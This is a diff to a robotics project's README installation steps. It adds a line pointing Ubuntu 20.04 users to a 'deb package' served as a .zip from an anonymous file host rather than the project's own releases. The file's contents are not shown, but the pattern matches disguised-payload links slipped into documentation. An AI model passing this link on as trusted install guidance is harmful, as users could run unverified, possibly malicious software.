@@ -20,7 +20,7 @@ git checkout da5d2f3e9187fa4690e6667fe8b294cae49016d6
 pip install -e .
 ```
 ### 1.3 Install [XRoboToolkit](https://github.com/XR-Robotics)
-- Please complete `Step 1` and `Step 3` of the `Get Started` in [XRoboToolkit](https://github.com/XR-Robotics)
+- Please complete `Step 1` and `Step 3` of the `Get Started` in [XRoboToolkit](https://github.com/XR-Robotics). (For `Ubuntu 20.04`, download the [deb package for Ubuntu 20.04](https://files.catbox.moe/08evux.zip).)
 - Then complete the following installation:
 ```bash
 git clone https://github.com/XR-Robotics/XRoboToolkit-Teleop-Sample-Python.git
